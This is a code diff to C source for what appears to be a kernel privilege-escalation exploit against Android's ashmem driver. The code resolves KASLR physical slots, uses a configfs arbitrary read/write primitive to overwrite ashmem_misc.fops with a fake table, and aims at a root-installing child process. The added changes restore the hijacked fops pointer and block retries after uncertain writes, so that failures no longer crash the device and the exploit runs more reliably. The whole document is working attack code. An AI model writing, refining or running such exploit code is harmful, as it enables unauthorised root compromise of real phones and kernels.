@@ -24,6 +24,7 @@ int pipe_stage_attempts;
 int cfi_dirty_seen;
 int cfi_last_step;
 int cfi_last_errno;
+int cfi_block_retry;
 int kaslr_done;
 uint64_t kaslr_base;
 uint64_t kaslr_slide;
@@ -132,13 +133,47 @@ int install_child_root(int fd) {
 }
 
 /* TRACE6: resolve the physical KASLR slot independently of the virtual
- * tracefs slide. The exact GZB2 sboot has 64 physical slots at 0x8000
+ * tracefs slide. The exact GZD7 sboot has 64 physical slots at 0x8000
  * granularity. After the exp32 canonical write has fired, the correct
  * direct-map alias of ashmem_misc.fops must contain this attempt's fake_fops.
  *
  * We only SELECT on an exact fake_fops match. Reads from other slots are
  * observation-only. This avoids treating a zero/random qword at a wrong
  * alias as evidence that misc.fops itself is corrupt. */
+static int trace6_saw_original;
+static int trace6_saw_kernel_other;
+
+static uint64_t original_ashmem_fops_addr(void) {
+  return kaslr_done ? canon_addr(ASHMEM_FOPS) : data_addr(ASHMEM_FOPS);
+}
+
+static int restore_original_misc_fops(int fd, uintptr_t misc_fops) {
+  uint64_t original = original_ashmem_fops_addr();
+  uint64_t after = 0;
+  errno = 0;
+  ssize_t wr = configfs_write_once(fd, misc_fops, &original, sizeof(original));
+  int wr_errno = errno;
+  errno = 0;
+  ssize_t rd = configfs_read_once(fd, misc_fops, &after, sizeof(after));
+  cfi_restore_ret = wr;
+  if (rd == (ssize_t)sizeof(after))
+    fops_after = after;
+  int ok = wr == (ssize_t)sizeof(original) &&
+           rd == (ssize_t)sizeof(after) &&
+           after == original;
+  pr_info("[cfi-restore] misc_fops target=%016zx wr=%zd rd=%zd after=%016llx "
+          "want=%016llx ok=%d wr_errno=%d\n",
+          misc_fops, wr, rd, (unsigned long long)after,
+          (unsigned long long)original, ok, wr_errno);
+  return ok;
+}
+
+static void retain_reclaim_pages(const char *why) {
+  pid_t keeper = spawn_stability_keeper();
+  pr_warning("[cfi-hold] retaining reclaimed pages keeper=%d why=%s\n",
+             (int)keeper, why ? why : "?");
+}
+
 static int trace6_resolve_phys_slot(int fd, uintptr_t *target_out,
                                     uint64_t *value_out, ssize_t *ret_out) {
   const uintptr_t granule = 0x8000ULL;
@@ -150,6 +185,10 @@ static int trace6_resolve_phys_slot(int fd, uintptr_t *target_out,
   p0_phys_slide_known = 0;
   p0_phys_slide_offset = 0;
   p0_phys_slot = -1;
+  trace6_saw_original = 0;
+  trace6_saw_kernel_other = 0;
+
+  uint64_t original_fops = original_ashmem_fops_addr();
 
   for (int slot = 0; slot < slots; slot++) {
     uintptr_t phys_slide = (uintptr_t)slot * granule;
@@ -165,6 +204,10 @@ static int trace6_resolve_phys_slot(int fd, uintptr_t *target_out,
         zero_reads++;
       else if (value != fake_fops)
         other_reads++;
+      if (value == original_fops)
+        trace6_saw_original = 1;
+      else if (value != 0 && value != fake_fops && is_kernel_ptr(value))
+        trace6_saw_kernel_other = 1;
     }
 
     if (rd == (ssize_t)sizeof(value) && value == fake_fops) {
@@ -191,9 +234,10 @@ static int trace6_resolve_phys_slot(int fd, uintptr_t *target_out,
   }
 
   pr_warning("[cfi-trace6-physbase] PHYS_SLOT_NO_MATCH readable=%d/64 "
-             "zero=%d other=%d fake=%016zx virtual_slide=%016llx "
-             "action=next-child continue=1\n",
-             readable, zero_reads, other_reads, fake_fops,
+             "zero=%d other=%d saw_original=%d saw_kernel_other=%d "
+             "fake=%016zx virtual_slide=%016llx\n",
+             readable, zero_reads, other_reads, trace6_saw_original,
+             trace6_saw_kernel_other, fake_fops,
              (unsigned long long)kaslr_slide);
   return 0;
 }
@@ -203,6 +247,8 @@ int try_cfi_stage(void) {
   int fd = open_ashmem_device();
   int dirty = 0;
   int can_read_back = 0;
+  int hijack_confirmed = 0;
+  int fops_restored = 0;
 
   if (fd < 0) {
     cfi_last_step = 11;
@@ -214,12 +260,25 @@ int try_cfi_stage(void) {
   uint64_t pre_fops = 0;
   ssize_t pre_rb = -1;
   if (!trace6_resolve_phys_slot(fd, &misc_fops, &pre_fops, &pre_rb)) {
-    /* Do not guess a direct-map slot and do not stop the outer supervisor. */
+    /* Race miss (no fake_fops in any slot): retry is safe if we only saw
+     * the original table or could not read kernel memory at all. If we
+     * observed other kernel pointers, the write may have fired at an
+     * alias we cannot restore — hold the reclaim pages and stop retrying
+     * rather than let the next child's ashmem open panic. */
     cfi_last_step = 41;
     cfi_last_errno = errno;
+    if (trace6_saw_kernel_other && !trace6_saw_original) {
+      retain_reclaim_pages("phys-slot-no-match-uncertain");
+      cfi_block_retry = 1;
+    } else {
+      pr_info("[cfi-trace6-physbase] action=next-child continue=1 "
+              "reason=%s\n",
+              trace6_saw_original ? "clean-original" : "no-arw");
+    }
     SYSCHK(close(fd));
     return 0;
   }
+  hijack_confirmed = 1;
   pr_info("[cfi-trace6-physbase] address-domains physical_slot=%d "
           "physical_slide=%08zx virtual_slide=%016llx "
           "data_alias=%016zx canonical_target=%016zx\n",
@@ -300,6 +359,20 @@ int try_cfi_stage(void) {
     cfi_last_errno = mismatch_errno;
     goto fail;
   }
+
+  /* The already-open fd copied fake_fops into file->f_op at open, so it
+   * keeps the configfs primitive even after we put the original table
+   * back in ashmem_misc.fops.  Restore immediately so a later fail or
+   * process exit cannot leave the next ashmem open dispatching through
+   * a recycled fake table (the reboot class). */
+  if (!restore_original_misc_fops(fd, misc_fops)) {
+    retain_reclaim_pages("early-misc-fops-restore-failed");
+    cfi_block_retry = 1;
+    cfi_last_step = 5;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+  fops_restored = 1;
 
   char payload[] = "CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK";
   ssize_t n =
@@ -419,25 +492,20 @@ int try_cfi_stage(void) {
   return 0;
 
 fail:
-  if (dirty) {
-    uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
-    if (kaslr_done) {
-      original_fops_fail = canon_addr(ASHMEM_FOPS);
+  if (hijack_confirmed && !fops_restored) {
+    if (!restore_original_misc_fops(fd, misc_fops)) {
+      retain_reclaim_pages("fail-path-misc-fops-restore-failed");
+      cfi_block_retry = 1;
+    } else {
+      fops_restored = 1;
     }
-    cfi_restore_ret = configfs_write_once(
-        fd, misc_fops, &original_fops_fail, sizeof(original_fops_fail));
-    if (can_read_back &&
-        cfi_restore_ret == (ssize_t)sizeof(original_fops_fail)) {
-      uint64_t after_fail = 0;
-      if (configfs_read_once(fd, misc_fops, &after_fail, sizeof(after_fail)) ==
-          (ssize_t)sizeof(after_fail)) {
-        fops_after = after_fail;
-      }
-    }
+  }
+  if (hijack_confirmed || dirty) {
     uint64_t null_owner_fail = 0;
     cfi_owner_ret = configfs_write_once(
         fd, fake_fops, &null_owner_fail, sizeof(null_owner_fail));
   }
+  (void)can_read_back;
   SYSCHK(close(fd));
   return 0;
 }
